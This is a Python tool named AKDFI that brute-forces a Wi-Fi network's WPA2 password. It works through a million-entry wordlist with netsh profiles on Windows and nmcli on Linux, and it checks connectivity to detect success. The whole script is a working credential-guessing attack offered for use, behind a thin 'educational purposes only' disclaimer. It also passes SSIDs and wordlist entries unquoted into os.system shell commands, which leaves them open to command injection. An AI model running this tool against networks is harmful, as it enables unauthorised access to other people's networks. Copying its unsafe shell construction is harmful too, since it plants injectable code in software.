import os
import time
import platform
import sys
print("\n*****************************************************************")
print("\n* AKDFI  --Windows/Linux                                        *")
print("\n* Version 2.0                                                   *")
print("\n*****************************************************************")
print("\n*****************************************************************")
print("\n* Copyright of AKD, 2023                                        *")
print("\n* https://www.adarshkrdubay.tech                                *")
print("\n*****************************************************************")
print("\n*****************************************************************")
print("\n* Please note that this code can be improved by using functions.*")
print("\n* It is not programmed to cater for all situations.             *")
print("\n* This code is provided for educational purposes only.          *")
print("\n* Do good. Be Ethical. Happy Hacking                            *")
print("\n*****************************************************************")
if platform.system() == 'Windows':
    def createprofile(name, password):
        config = """<?xml version=\"1.0\"?>
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    	<name>"""+name+"""</name>
    	<SSIDConfig>
    		<SSID>
    			<name>"""+name+"""</name>
    		</SSID>
    	</SSIDConfig>
    	<connectionType>ESS</connectionType>
    	<connectionMode>auto</connectionMode>
    	<MSM>
    		<security>
    			<authEncryption>
    				<authentication>WPA2PSK</authentication>
    				<encryption>AES</encryption>
    				<useOneX>false</useOneX>
    			</authEncryption>
    			<sharedKey>
    				<keyType>passPhrase</keyType>
    				<protected>false</protected>
    				<keyMaterial>"""+password+"""</keyMaterial>
    			</sharedKey>
    		</security>
    	</MSM>
    </WLANProfile>"""
        command = f"netsh wlan add profile filename={name}.xml interface=Wi-Fi > .creatxml"
        with open(name+".xml", 'w') as file:
            file.write(config)
        os.system(command)
    def connect(name,password):
        command = f"netsh wlan connect name={name} ssid={name} interface=Wi-Fi > .connect "
        os.system(command)
        print(f"trying {password} for {name}")
        time.sleep(5)
        os.system("ping 8.8.8.8 -n 1 > .ping.txt")
        cheek=open(".ping.txt","r")
        cheek=cheek.read()
        if "Destination host unreachable" in cheek or " transmit failed" in cheek or "General failure" in cheek or "100% loss" in cheek:
            print()
        else:
            print(f"{password} is password for {name}")
            os.system(f"del .connect .ping.txt .creatxml {name}.xml")
            sys.exit()
    def displayAvailableNetworks():
    	command = """netsh wlan show networks interface=Wi-Fi | find "SSID" """
    	os.system(command)
    if __name__=="__main__":
        try:
            displayAvailableNetworks()
            name = input("Name of Wi-Fi: ")
            if name=="":
                print("No name provide")
                exit()
            password_list=[]
            listfile=open("wordlists/10-million-password-list-top-1000000.txt","r")
            for fill in listfile:
                    password_list.append(fill.replace("\n",""))
            for password in password_list:
                    if len(password)>=8:
                        createprofile(name, password)
                        connect(name, password)
        except KeyboardInterrupt:
            print("\nExitting... 'Ctrl + c'")
            sys.exit()
if platform.system() == 'Linux':
    os.system("ls /sys/class/net/ | grep w > .intfear.lis")
    listfile=open(".intfear.lis","r")
    intf_list=[]
    for fill in listfile:
        intf_list.append(fill.replace("\n",""))
    print("[+] Wifi interface list")
    for liss in intf_list:
        print(liss)
    interface=input("Enter the interface")
    if interface not in intf_list:
        print("[-] Interface not avlable")
        sys.exit(1)
    os.system(f"sudo nmcli d wifi list ifname {interface} " )
    wifiname=input("select the wifi you want to bruteforce")
    if wifiname=="":
        print("No name provide")
        sys.exit()
    password_list=[]
    listfile=open("wordlists/10-million-password-list-top-1000000.txt","r")
    for fill in listfile:
        if len(fill)>=8:
            password_list.append(fill.replace("\n",""))
    for word in password_list:
                    print(f"trying {word} as password ")
                    os.system(f"sudo nmcli d wifi connect {wifiname} password {word} ifname {interface} > con.txt")
                    passcheek=open("con.txt","r")
                    passcheek=passcheek.read()
                    if "successfully" in passcheek:
                                    print("Password cracked")
                                    print(f"Password of '{wifiname}' is '{word}'")
                                    sys.exit()
                    else:
                            print(f"{word} was not the password")

